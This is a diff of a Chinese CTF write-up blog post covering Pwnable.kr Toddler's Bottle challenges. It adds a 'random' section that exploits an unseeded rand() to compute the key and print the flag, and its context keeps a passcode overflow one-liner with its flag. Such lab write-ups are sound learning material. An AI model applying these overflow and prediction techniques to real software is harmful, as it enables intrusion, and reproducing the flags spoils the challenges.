@@ -28,7 +28,7 @@
 <meta property="og:description" content="Pwnable.kr Toddler&#39;s Bottle 练习记录。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2026-01-12T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-01-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-20T16:00:00.000Z">
 <meta property="article:author" content="Voxzz">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -158,7 +158,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#fd"><span class="nav-number">1.</span> <span class="nav-text">fd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#collision"><span class="nav-number">2.</span> <span class="nav-text">collision</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bof"><span class="nav-number">3.</span> <span class="nav-text">bof</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#passcode"><span class="nav-number">4.</span> <span class="nav-text">passcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#fd"><span class="nav-number">1.</span> <span class="nav-text">fd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#collision"><span class="nav-number">2.</span> <span class="nav-text">collision</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bof"><span class="nav-number">3.</span> <span class="nav-text">bof</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#passcode"><span class="nav-number">4.</span> <span class="nav-text">passcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#random"><span class="nav-number">5.</span> <span class="nav-text">random</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -267,7 +267,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-01-20 00:00:00" itemprop="dateModified" datetime="2026-01-20T00:00:00+08:00">2026-01-20</time>
+      <time title="修改时间：2026-01-21 00:00:00" itemprop="dateModified" datetime="2026-01-21T00:00:00+08:00">2026-01-21</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -345,6 +345,17 @@
 
 <p>借助 Python 向程序传参，得到 flag 信息。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">passcode@ubuntu:~$ python2 -c &#x27;print &quot;a&quot; * 96 + &quot;\x14\xc0\x04\x08&quot; + &quot;134517409&quot;&#x27; | ./passcode</span><br><span class="line">Toddler&#x27;s Secure Login System 1.1 beta.</span><br><span class="line">enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</span><br><span class="line">s0rry_mom_I_just_ign0red_c0mp1ler_w4rning</span><br><span class="line">enter passcode1 : Now I can safely trust you that you have credential :)</span><br></pre></td></tr></table></figure>
+
+<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>查看程序源码，当输入数据与随机数异或结果为 0xcafebabe 时，得到 flag 信息。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> random;</span><br><span class="line">	random = rand();	<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( (key ^ random) == <span class="number">0xcafebabe</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">		setregid(getegid(), getegid());</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于程序在调用 <code>rand()</code> 函数之前，未调用 <code>srand()</code> 函数初始化随机数种子，因此系统会默认以 1 为种子生成随机数，这将导致每次运行程序生成的随机数均相同。</p>
+<p>本地调试程序，得到生成的随机数 0x6b8b4567。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*RAX  0x6b8b4567</span><br><span class="line"></span><br><span class="line">   0x555555555216 &lt;main+13&gt;    mov    rax, qword ptr fs:[0x28]</span><br><span class="line">   0x55555555521f &lt;main+22&gt;    mov    qword ptr [rbp - 0x18], rax</span><br><span class="line">   0x555555555223 &lt;main+26&gt;    xor    eax, eax</span><br><span class="line">   0x555555555225 &lt;main+28&gt;    mov    eax, 0</span><br><span class="line">   0x55555555522a &lt;main+33&gt;    call   rand@plt                    &lt;rand@plt&gt;</span><br><span class="line"> </span><br><span class="line"> ► 0x55555555522f &lt;main+38&gt;    mov    dword ptr [rbp - 0x1c], eax</span><br></pre></td></tr></table></figure>
+
+<p>异或计算得到正确的 key 值为 0xa175ffd9，即十进制 2708864985。</p>
+<p>运行程序，得到 flag 信息。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">random@ubuntu:~$ ./random</span><br><span class="line">2708864985</span><br><span class="line">Good!</span><br><span class="line">m0mmy_I_can_predict_rand0m_v4lue!</span><br></pre></td></tr></table></figure>
 
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://pwnable.kr/">pwnable.kr</a></p>
 
